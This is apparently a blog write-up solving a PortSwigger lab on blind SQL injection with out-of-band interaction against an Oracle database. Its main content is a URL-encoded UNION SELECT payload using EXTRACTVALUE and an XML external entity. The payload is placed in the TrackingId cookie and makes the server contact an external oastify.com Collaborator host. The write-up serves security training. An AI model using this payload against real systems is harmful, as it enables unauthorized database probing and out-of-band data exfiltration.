---
author: Nithissh S
pubDatetime: 2024-09-11T15:22:00Z
modDatetime: 2024-09-11T09:12:47.400Z
title: Blind SQL injection with out-of-band interaction
slug: sqli-portswigger-lab-15
featured: false
draft: false
tags:
  - BSCP
  - SQL Injection
description:
  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain. To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator. 
---

## Objective 

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator. 

## Solution 

The Particular lab is utilising oracle database and we can able to find this using the `sqlmap` and I don't wanna go further with it 

Going through the cheatsheet, In order to achieve the DNS lookup off particular server we are controlling.. this payload will be useful in it 

```sql
x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//h1j5djyu3nv2dr3jkiyc733sajga410pp.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

Let's send the above payload through `TrackingId` parameter inside `Cookie` and when we send the request.. As it response with status code of `200` 

![](../../assets/images/bscp/sqli/sqli54.png)

Checking the Burp collaborator, we have recieved few DNS pingbacks 

![](../../assets/images/bscp/sqli/sqli55.png)

Our endgoal is acheived and lab is solved 

![](../../assets/images/bscp/sqli/sqli56.png)